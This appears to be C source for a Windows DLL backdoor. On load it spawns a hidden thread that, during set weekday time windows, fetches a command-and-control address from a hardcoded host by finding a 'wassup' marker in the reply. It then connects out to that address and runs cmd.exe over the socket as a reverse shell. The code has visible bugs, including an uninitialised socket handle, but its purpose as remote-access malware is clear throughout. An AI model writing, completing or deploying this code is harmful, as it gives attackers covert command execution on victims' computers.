#include "funcs.h"

DWORD WINAPI BindThread( LPVOID lpParam ) {    
  WSADATA WSAData;
  SOCKET s;
  SOCKET AcceptedSocket;
  struct sockaddr_in service;
  STARTUPINFO StartupInfo;
  PROCESS_INFORMATION ProcessInformation;
  char ip[20] = {0} ;
  char port[20] = {0} ;
  int timeout = 3000 ;
  PRINTF( "bind to %s\n" , ( char* )lpParam ) ;
  memcpy( ip , ( char* )lpParam , 15 ) ;
  memcpy( port , ( char* )lpParam + 16 , 5 ) ;
  for( ; ; ) {
    PRINTF( "inside BindThread loop\n" ) ;
    WSAStartup( MAKEWORD( 2 , 2 ) , &WSAData ) ;
    s = WSASocketA( AF_INET , SOCK_STREAM , 0 , NULL , NULL , NULL ) ;
    service.sin_family = AF_INET ;
    service.sin_addr.s_addr = inet_addr( ip ) ;
    service.sin_port = htons( atoi( port ) ) ;
    PRINTF( "inside BindThread loop 2\n" ) ;
    /* bind( s , ( SOCKADDR* )&service , sizeof( service ) ) ; */
    /* listen( s , 0 ) ; */
    /* AcceptedSocket = accept( s , NULL , NULL ) ; */
    /* closesocket( s ) ; */
    connect( s , ( struct sockaddr* )&service , sizeof( service ) ) ;
    setsockopt( s , SOL_SOCKET , SO_SNDTIMEO , ( char* )&timeout , sizeof( timeout ) ) ;
    PRINTF( "inside BindThread loop 3\n" ) ;
    StartupInfo.hStdError = ( HANDLE )AcceptedSocket ;
    StartupInfo.hStdOutput = ( HANDLE )AcceptedSocket ;
    StartupInfo.hStdInput = ( HANDLE )AcceptedSocket ;
    StartupInfo.dwFlags = STARTF_USESTDHANDLES ;
    StartupInfo.cb = sizeof( StartupInfo ) ;
    PRINTF( "inside BindThread loop 4\n" ) ;
    CreateProcessA( 0 , "cmd.exe" , 0 , 0 , TRUE , 0 , 0 , 0 , &StartupInfo , &ProcessInformation ) ;
    PRINTF( "inside BindThread loop 5\n" ) ;
    WaitForSingleObject( ProcessInformation.hProcess , INFINITE ) ;
    PRINTF( "inside BindThread loop 6\n" ) ;
    Sleep( 40000000 ) ;
  }
}

BOOLEAN CheckLocalTime( ) {
  BOOLEAN rc = FALSE ;
  SYSTEMTIME lt ;
  GetLocalTime( &lt ) ;
#ifdef _DEBUG_
  PRINTF( "%d-%d-%d %d:%d:%d %d\n" ,
          lt.wYear ,
          lt.wMonth ,
          lt.wDay ,
          lt.wHour ,
          lt.wMinute ,
          lt.wSecond ,
          lt.wDayOfWeek // 0 to 6 means Sunday to Saturday
    ) ;
#endif
  if( 1 == lt.wDayOfWeek &&  8 == lt.wHour && 30 <= lt.wMinute && 40 >= lt.wMinute ) rc = TRUE ;
  if( 2 == lt.wDayOfWeek &&  9 == lt.wHour && 20 <= lt.wMinute && 35 >= lt.wMinute ) rc = TRUE ;
  if( 3 == lt.wDayOfWeek && 10 == lt.wHour && 15 <= lt.wMinute && 25 >= lt.wMinute ) rc = TRUE ;
  if( 4 == lt.wDayOfWeek && 11 == lt.wHour &&  5 <= lt.wMinute && 15 >= lt.wMinute ) rc = TRUE ;
  if( 5 == lt.wDayOfWeek && 15 == lt.wHour && 20 <= lt.wMinute && 35 >= lt.wMinute ) rc = TRUE ;
#ifdef _DEBUG_
  rc = TRUE ;
#endif
  PRINTF( "rc of CheckLocalTime : %d\n" , rc ) ;
  return rc ;
}

void GetCCInfo( char* address ) {
  int iResult ;
  WSADATA wsaData ;
  SOCKET ConnectSocket = INVALID_SOCKET ;
  struct sockaddr_in clientService ;
  int recvbuflen = DEFAULT_BUFLEN ;
  char recvbuf[DEFAULT_BUFLEN] = "" ;
  struct hostent *remoteHost ;
  struct in_addr addr ;
  int i ;
  int found[6] = { 0 , 0 , 0 , 0 , 0 , 0 } ;
  char addr_inner[DEFAULT_BUFLEN*3] ;
  char buff_inner_last[DEFAULT_BUFLEN+1] ;
  char buff_inner[DEFAULT_BUFLEN+1] ;
  int split ;
  srand( ( unsigned )time( NULL ) ) ;
  split = rand()%RANDOM_SEND_GET_SPLIT ;
  PRINTF( "wait %d then send get request\n" , split ) ;
  Sleep( split * 1000 ) ;
  iResult = WSAStartup( MAKEWORD( 2 , 2 ) , &wsaData ) ;
#ifdef _DEBUG_
  if( NO_ERROR != iResult ) {
    PRINTF( "WSAStartup error : %d\n" , iResult ) ;
    return 1 ;
  } // end of if( NO_ERROR != iResult )
#endif
  ConnectSocket = socket( AF_INET , SOCK_STREAM , IPPROTO_TCP ) ;
#ifdef _DEBUG_
  if( INVALID_SOCKET == ConnectSocket ) {
    PRINTF( "socket error : %ld\n" , WSAGetLastError( ) ) ;
    WSACleanup( ) ;
    return 1 ;
  } // end of if( INVALID_SOCKET == ConnectSocket )
#endif
  remoteHost = gethostbyname( HOSTNAME ) ;
#ifdef _DEBUG_
  if( NULL == remoteHost ) {
    PRINTF( "[-] remoteHost : %p\n" , remoteHost ) ;
  }
  else {
#endif
    i = 0 ;
    if( remoteHost->h_addrtype == AF_INET ) {
      while( remoteHost->h_addr_list[i] != 0 ) {
        addr.s_addr = *(u_long *)remoteHost->h_addr_list[i++] ;
#ifdef _DEBUG_
        PRINTF( "IP Address #%d : %s\n" , i , inet_ntoa( addr ) ) ;
#endif
      }
    }
#ifdef _DEBUG_
    else {
      PRINTF( "[-] remoteHost->h_addrtype == AF_INET" ) ;
    }
  }
#endif
  clientService.sin_family = AF_INET ;
  clientService.sin_addr.s_addr = addr.s_addr ;
  clientService.sin_port = htons( DEFAULT_PORT ) ;
  iResult = connect( 
    ConnectSocket , 
    ( SOCKADDR* )&clientService , 
    sizeof( clientService ) 
    ) ;
#ifdef _DEBUG_
  if( SOCKET_ERROR == iResult ) {
    PRINTF( "[-] connect : %d\n" , WSAGetLastError( ) ) ;
    closesocket( ConnectSocket ) ;
    WSACleanup( ) ;
    return 1 ;
  } // end of if( SOCKET_ERROR == iResult )
#endif
  iResult = send( 
    ConnectSocket , 
    CONTEXT ,
    sizeof( CONTEXT ) ,
    0
    ) ;
#ifdef _DEBUG_
  if( SOCKET_ERROR == iResult ) {
    PRINTF( "[-] send : %d\n" , WSAGetLastError( ) ) ;
    closesocket( ConnectSocket ) ;
    WSACleanup( ) ;
    return 1 ;  
  } // end of if( SOCKET_ERROR == iResult )
#endif
  memset( buff_inner , 0 , DEFAULT_BUFLEN + 1 ) ;
  memset( buff_inner_last , 0 , DEFAULT_BUFLEN + 1 ) ;
  memset( addr_inner , 0 , DEFAULT_BUFLEN * 3 ) ;
  do {
    memcpy( buff_inner_last , buff_inner , iResult ) ;
    iResult = recv( ConnectSocket , recvbuf , recvbuflen , 0 ) ;
    memcpy( buff_inner , recvbuf , iResult ) ;
    buff_inner[DEFAULT_BUFLEN] = '\0' ;
    if( iResult > 0 ) {
      if( found[0] && found[1] && found[2] && found[3] && found[4] && found[5] ) {
        strcat( addr_inner , buff_inner ) ;
        if( strlen( addr_inner ) > 33 ) 
          break ;
        else 
        // shows in the end of this buffer, needs next buffer to complete
          continue ;
      }
      for( i = 0 ; i < DEFAULT_BUFLEN ; i ++ ) {
        if( buff_inner[i] == 'w' && !found[0] ) {
          found[0] = 1 ;
        }
        else if( buff_inner[i] == 'a' && found[0] && !found[1] ) {
          found[1] = 1 ;
        }
        else if( buff_inner[i] == 's' && found[1] && !found[2] ) {
          found[2] = 1 ;
        }
        else if( buff_inner[i] == 's' && found[2] && !found[3] ) {
          found[3] = 1 ;
        }
        else if( buff_inner[i] == 'u' && found[3] && !found[4] ) {
          found[4] = 1 ;
        }
        else if( buff_inner[i] == 'p' && found[4] && !found[5] ) {
          found[5] = 1 ;
        }
        else {
          found[0] = found[1] = found[2] = found[3] = found[4] = found[5] ;
        }
      }
      if( found[0] && found[1] && found[2] && found[3] && found[4] && found[5] ) {
        strcat( addr_inner , buff_inner_last ) ;
        strcat( addr_inner , buff_inner ) ;
      }
    }
    else if( 0 == iResult )
      PRINTF( "Connect closed\n" ) ;
    else
      PRINTF( "[-] recv : %ld\n" , WSAGetLastError( ) ) ;
  } while( iResult > 0 ) ;
  iResult = closesocket( ConnectSocket ) ;
#ifdef _DEBUG_
  if( SOCKET_ERROR == iResult ) {
    PRINTF( "[-] closesocket : %d\n" , WSAGetLastError( ) ) ;
    closesocket( ConnectSocket ) ;
    WSACleanup( ) ;
    return 1 ;  
  } // end of if( SOCKET_ERROR == iResult )
#endif
  memcpy( address , strstr( addr_inner , "wassup" ) + 6 , 21 ) ;
  PRINTF( "address : %s\n" , address ) ;
}

BOOLEAN CheckAddress( char* address ) {
  BOOLEAN rc = TRUE ;
  if( '.' == address[0] && '.' == address[1] && '.' == address[2] )
    rc = FALSE ;
  PRINTF( "rc of CheckAddress : %d\n" , rc ) ;
  return rc ;
}

DWORD WINAPI DaemonThread( LPVOID lpParam ) {
  DWORD dwBindThreadId ;
  HANDLE hBindThread = NULL ;
  char address[DEFAULT_BUFLEN] ;
  for( ; ; ) {
    if( CheckLocalTime( ) ) {
      GetCCInfo( &address ) ;
      if( CheckAddress( &address ) ) {
        if( !hBindThread ) {
          hBindThread = CreateThread(
            NULL ,
            0 ,
            BindThread ,
            address ,
            0 ,
            &dwBindThreadId
            ) ;
          WaitForSingleObject( hBindThread , 1 ) ;
        } // end of if( !hBindThread )
      } // end of if( CheckAddress( &address ) )
      else {
        TerminateThread( hBindThread , 0 ) ;
        CloseHandle( hBindThread ) ;
        hBindThread = NULL ;
      }
    } // end of if( CheckLocalTime( ) )
    else {
      TerminateThread( hBindThread , 0 ) ;
      CloseHandle( hBindThread ) ;
      hBindThread = NULL ;
    }
    Sleep( CHECK_LOCAL_TIME_SPLIT * 1000 ) ;
  }
}

BOOL WINAPI DllMain(
  _In_ HINSTANCE hinstDLL,
  _In_ DWORD     fdwReason,
  _In_ LPVOID    lpvReserved
  ) {
  DWORD dwDaemonThreadId ;
  HANDLE hDaemonThread ;
  switch( fdwReason ) {
  case DLL_PROCESS_ATTACH :
    hDaemonThread = CreateThread(
      NULL ,
      0 ,
      DaemonThread ,
      NULL ,
      0 ,
      &dwDaemonThreadId
      ) ;
    WaitForSingleObject( hDaemonThread , 1 ) ;
    CloseHandle( hDaemonThread ) ;
    break ;
  case DLL_PROCESS_DETACH :
  case DLL_THREAD_ATTACH :
  case DLL_THREAD_DETACH :
    break ;
  } // end of switch( fdwReason )
  return TRUE ;
}
